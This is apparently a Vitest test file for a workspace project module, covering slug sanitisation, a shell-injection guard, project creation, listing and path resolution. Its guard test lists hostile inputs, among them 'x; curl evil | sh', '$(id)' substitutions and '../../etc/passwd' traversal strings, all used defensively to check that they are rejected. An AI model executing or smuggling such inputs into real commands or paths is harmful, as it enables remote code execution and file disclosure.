import { existsSync, mkdtempSync, writeFileSync, mkdirSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { beforeEach, describe, expect, it } from "vitest";
import {
  assertValidSlug,
  createProject,
  listProjects,
  resolveProjectDir,
  sanitizeProjectName,
} from "../src/core/projects";

let ws: string;
beforeEach(() => {
  ws = mkdtempSync(join(tmpdir(), "claudebox-ws-"));
});

describe("sanitizeProjectName", () => {
  it("slugifies a friendly name", () => {
    expect(sanitizeProjectName("My First Website!")).toBe("my-first-website");
  });

  it("rejects empty / whitespace-only names", () => {
    expect(() => sanitizeProjectName("   ")).toThrow();
    expect(() => sanitizeProjectName("")).toThrow();
  });

  it("neutralises path traversal and separators (no escaping the Workspace)", () => {
    expect(sanitizeProjectName("../../etc/passwd")).not.toContain("..");
    expect(sanitizeProjectName("../../etc/passwd")).not.toContain("/");
    expect(sanitizeProjectName("a/b/c")).toBe("a-b-c");
  });
});

describe("assertValidSlug (Box-side shell-injection guard)", () => {
  it("accepts the shape sanitizeProjectName produces", () => {
    expect(assertValidSlug("my-first-website")).toBe("my-first-website");
    expect(assertValidSlug(sanitizeProjectName("Guessing Game 2"))).toBe("guessing-game-2");
  });

  it("rejects anything carrying shell metacharacters or path parts", () => {
    for (const bad of ['x; curl evil | sh', "a/b", "../etc", "a b", "a$(id)", "a`id`", "", "-lead", "UP"]) {
      expect(() => assertValidSlug(bad)).toThrow(/Unsafe Project slug/);
    }
  });
});

describe("createProject", () => {
  it("creates the Project as its own folder in the Workspace", () => {
    const p = createProject(ws, "Guessing Game");
    expect(p.slug).toBe("guessing-game");
    expect(p.dir).toBe(join(ws, "guessing-game"));
    expect(existsSync(p.dir)).toBe(true);
  });

  it("preserves the display name", () => {
    expect(createProject(ws, "Guessing Game").name).toBe("Guessing Game");
  });

  it("refuses to create two Projects at the same folder", () => {
    createProject(ws, "Report");
    expect(() => createProject(ws, "report")).toThrow(/exists/i);
  });
});

describe("listProjects", () => {
  it("is empty for a fresh Workspace", () => {
    expect(listProjects(ws)).toEqual([]);
  });

  it("lists created Projects, keeping their files separate", () => {
    createProject(ws, "Alpha");
    createProject(ws, "Beta");
    writeFileSync(join(ws, "alpha", "a.txt"), "a");
    writeFileSync(join(ws, "beta", "b.txt"), "b");

    const slugs = listProjects(ws).map((p) => p.slug).sort();
    expect(slugs).toEqual(["alpha", "beta"]);
    expect(existsSync(join(ws, "alpha", "b.txt"))).toBe(false);
  });

  it("ignores non-directories and dotfiles at the Workspace root", () => {
    createProject(ws, "Real");
    writeFileSync(join(ws, "loose.txt"), "x");
    mkdirSync(join(ws, ".hidden"));
    expect(listProjects(ws).map((p) => p.slug)).toEqual(["real"]);
  });
});

describe("resolveProjectDir", () => {
  it("returns the Project directory for a valid slug", () => {
    createProject(ws, "Demo");
    expect(resolveProjectDir(ws, "demo")).toBe(join(ws, "demo"));
  });

  it("refuses to resolve outside the Workspace (defence in depth)", () => {
    expect(() => resolveProjectDir(ws, "../secrets")).toThrow();
    expect(() => resolveProjectDir(ws, "/etc")).toThrow();
  });
});
